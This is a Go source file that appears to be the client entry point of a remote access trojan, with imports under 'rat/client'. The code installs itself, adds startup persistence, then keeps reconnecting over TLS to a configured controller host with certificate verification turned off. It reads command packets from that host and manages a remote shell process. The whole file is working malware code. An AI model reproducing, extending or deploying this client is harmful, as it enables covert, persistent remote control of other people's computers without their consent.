package main

import (
	"crypto/tls"
	"fmt"
	"os/exec"
	"rat/client/install"
	"rat/client/startup"
	"rat/common"
	"time"
)

func main() {
	err := ParseConfig()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	if !install.IsInstalled(Config.Install) {
		file, err := install.Install(Config.Name, Config.Install)
		if err != nil {
			fmt.Println("install:", err.Error())
		} else {
			err = exec.Command(file).Start()
			if err != nil {
				fmt.Println(err.Error())
			}
		}
	}

	err = startup.InstallCurrent(Config.Name)
	if err != nil {
		fmt.Println("Install failed:", err.Error())
	}

	start(Config)
}

func start(config common.BinaryConfig) {
	for {
		host := config.Host
		fmt.Println("Connecting to", host)

		conn, err := tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true,
		})

		con := Connection{
			Conn: conn,
		}

		if err != nil {
			fmt.Println(err.Error())
			goto end
		}

		Queue = make(chan OutgoingPacket)
		Transfers = make(TransfersMap)

		go func() {
			for {
				packet := <-Queue
				con.WritePacket(packet)
			}
		}()

		con.Init()

		for {
			header, err := con.ReadHeader()

			if err != nil {
				fmt.Println(err.Error())
				con.Close()
				break
			}

			packet := GetIncomingPacket(header)
			err = packet.Read(&con)

			if err != nil {
				fmt.Println(err.Error())
				con.Close()
				break
			}
		}

	end:
		Close()
		time.Sleep(time.Second * time.Duration(config.Delay))
	}
}

// Close is called when connection is lost
func Close() {
	// Kill any running shell
	if current.process != nil {
		current.process.Process.Kill()
	}
}
